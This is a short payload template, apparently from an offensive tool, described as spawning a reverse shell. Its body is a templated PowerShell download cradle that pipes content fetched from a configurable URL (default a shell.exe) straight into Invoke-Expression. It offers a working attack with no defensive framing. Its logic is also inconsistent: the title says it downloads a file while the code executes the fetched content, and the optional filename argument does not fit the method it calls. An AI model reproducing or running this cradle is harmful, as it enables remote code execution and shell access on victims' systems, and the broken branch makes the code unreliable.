##########
Name: Download file from url
Author: Jusmistic
Description: Spawn Reverse shell
Options:
    url: http://127.0.0.1/shell.exe
    execute: False
    filename: shell.exe
##########
iex (New-Object Net.WebClient).DownloadString('{{url}}'{% if execute %}, '{{filename}}'{% endif %});